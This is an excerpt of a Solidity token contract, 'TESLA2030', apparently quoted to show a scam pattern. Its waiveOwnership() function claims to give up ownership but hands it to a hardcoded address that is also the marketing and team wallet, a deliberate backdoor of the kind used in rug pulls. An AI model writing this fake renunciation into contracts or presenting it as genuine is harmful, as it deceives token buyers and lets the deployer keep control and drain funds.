...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x9e8b7b1A629558061AE3860557b57BFfC13050cd);
    }
...
contract TESLA2030 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TESLA 2023";
    string private _symbol = "TESLA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9e8b7b1A629558061AE3860557b57BFfC13050cd);
    address payable public teamWalletAddress = payable(0x9e8b7b1A629558061AE3860557b57BFfC13050cd);
